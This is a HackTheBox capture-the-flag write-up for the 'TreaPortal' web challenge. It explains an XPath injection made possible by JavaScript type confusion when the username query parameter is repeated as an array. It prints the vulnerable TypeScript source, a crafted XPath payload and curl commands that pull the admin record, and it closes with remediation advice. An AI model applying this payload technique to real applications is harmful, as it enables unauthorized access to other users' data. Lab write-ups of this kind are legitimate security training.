# TreaPortal — HackTheBox Writeup

> **Category:** Web &nbsp;·&nbsp; **Difficulty:** `Easy` &nbsp;·&nbsp; **Stack:** Fastify · TypeScript · `@xmldom/xmldom`
>
> **Vulnerability:** XPath Injection via JavaScript **Type Confusion**

![category](https://img.shields.io/badge/Category-Web-0f6d63?style=flat-square)
![difficulty](https://img.shields.io/badge/Difficulty-Easy-4caf50?style=flat-square)
![vuln](https://img.shields.io/badge/Vuln-XPath_Injection-b03636?style=flat-square)
![status](https://img.shields.io/badge/Status-Solved-success?style=flat-square)

---

## Table of Contents

- [TL;DR](#tldr)
- [1. Recon](#1-recon)
- [2. Source Code Analysis](#2-source-code-analysis)
- [3. The Vulnerability Chain](#3-the-vulnerability-chain)
- [4. Building the Payload](#4-building-the-payload)
- [5. Exploitation](#5-exploitation)
- [6. The Flag](#6-the-flag)
- [7. Remediation & Lessons](#7-remediation--lessons)

---

## TL;DR

The app stores users in an XML file and queries it with the `xpath` library. The
`/api/user/` endpoint can return **another user's `flag` field** — if you bypass three
protection layers at once.

The key trick: send the `username` parameter as an **array** (`?username=A&username=B`).
This single move defeats all three guards — the `typeof` check, the blacklist, and the
XPath query — producing a clean XPath injection that selects the `admin` node.

```
HTB{REDACTED}
```

---

## 1. Recon

The challenge ships with source code (`web_treaportal.zip`, password `hackthebox`) — so this
is a **whitebox** challenge. `package.json` immediately points the way:

```json
"@xmldom/xmldom": "^0.9.9",
"xpath": "^0.0.34",
"fastify": "^5.8.4"
```

Reading XML and running `xpath` queries is a classic sign of **XPath injection**. Where the
flag lives is revealed by `src/db/init.ts` — it is written into the `admin` user's `<flag>`
element:

```xml
<user>
  <username>admin</username>
  <role>administrator</role>
  <flag>${flag}</flag>   <!-- target -->
</user>
```

---

## 2. Source Code Analysis

The only place the flag is returned is `/api/user/` in `src/routes/user.ts`. It puts up
three barriers:

```ts
// src/routes/user.ts
fastify.get('/', { preHandler: [fastify.authenticate] }, async (req, res) => {
  const { username } = req.query as any
  const tokenPayload = req.user as IJwtPayload

  // (A) only checks when it IS a string:
  if (typeof username === 'string' && username !== tokenPayload.username) {
    return res.status(403).send({ err: 'Access denied' })
  }

  const user = await getUserByUsername(username)            // (B)
  return { username: user.username, /* ... */, flag: user.flag }  // flag returned!
})
```

And `getUserByUsername` holds the blacklist (C) and the vulnerable XPath query (D):

```ts
// src/services/userService.ts
function looksLikeXPathInjection(input) {                    // (C)
  const blacklist = ["'", ';', 'or', 'and', ')', '(', '/', 'doc']
  return blacklist.some(p => input.includes(p))
}

async function getUserByUsername(username) {
  if (looksLikeXPathInjection(username)) throw new Error('bad')
  const node = xpath.select1(`//user[username='${username}']`, doc)   // (D)
  return nodeToUser(node)
}
```

---

## 3. The Vulnerability Chain

The one trick — send `username` as an array: `?username=A&username=B`. Fastify turns this
into `["A","B"]`. Each guard then collapses on its own:

| Step | Guard | Why it fails for an array |
|:----:|-------|---------------------------|
| **A** | `typeof username === 'string'` → 403 | Returns `false` for an array → the "Access denied" branch is **skipped entirely**. |
| **C** | `input.includes(p)` blacklist | On an array, `.includes("'")` checks **element membership**, not substring. No element *equals* a blacklist token → filter passes. |
| **D** | `` `//user[username='${username}']` `` | A template literal joins the array with commas (`${["A","B"]}` → `"A,B"`), so `'` and `or` land in the query safely. |

---

## 4. Building the Payload

Goal: make the predicate always true (or match `role='administrator'`), so `select1`
returns the first node — `admin`. Because the two array elements join with a comma, that
comma must land inside a string literal we don't use:

```
E1 = ' or role='administrator' or 'z
E2 = z

# ["E1","E2"].toString()  →  joined string:
' or role='administrator' or 'z,z

# final XPath after template interpolation:
//user[username='' or role='administrator' or 'z,z']
```

Parsed: `username=''` **OR** `role='administrator'` **OR** `'z,z'` (a non-empty string is
always true). The comma stays harmlessly inside the `'z,z'` literal, so the query never
breaks. Result: the first user — `admin` — is selected.

> **Why two array elements, not one?**
> Fastify's default query parser does **not** turn `?username[]=x` into an array; only a
> repeated key (`username=A&username=B`) yields an array — with at least two elements. That
> is why the payload is built to tolerate the joining comma.

---

## 5. Exploitation

First register to obtain a JWT (the email must end in `@trea.htb`), then fire the payload:

```bash
BASE="http://<TARGET_IP>:<PORT>"

# 1) Register -> JWT
JWT=$(curl -s -X POST "$BASE/api/auth/register" \
  -H 'Content-Type: application/json' \
  -d '{"username":"rootlab","email":"rootlab@trea.htb","password":"Passw0rd!123"}' \
  | sed -n 's/.*"jwt":"\([^"]*\)".*/\1/p')

# 2) XPath injection via array query param
curl -s -G "$BASE/api/user/" \
  -H "Authorization: Bearer $JWT" \
  --data-urlencode "username=' or role='administrator' or 'z" \
  --data-urlencode "username=z"
```

Response:

```json
{
  "username": "admin",
  "email": "admin@trea.htb",
  "salary": 15000,
  "role": "administrator",
  "flag": "HTB{REDACTED}"
}
```

---

## 6. The Flag

```
HTB{REDACTED}
```

---

## 7. Remediation & Lessons

Root cause: the user input's **type** was never reliably enforced, and the XPath query used
string interpolation.

- [x] **Enforce a request schema** on the query parameter — force `username` to
      `type: 'string'`. This kills the type confusion at the source.
- [x] Use **parameterized XPath** (`xpath.parse().select({ variables })`) instead of string
      interpolation.
- [x] Don't rely on a **blacklist** — it is always bypassable. Prefer an allowlist or proper
      escaping.
- [x] Enforce authorization **before** data is returned; a `typeof`-based check is dangerous
      because input can be an array or object.
- [x] **Separate** sensitive fields (`flag`, password hash) out of the shared user response.

---

<sub>TreaPortal · HTB Web · Easy · XPath Injection + Type Confusion</sub>
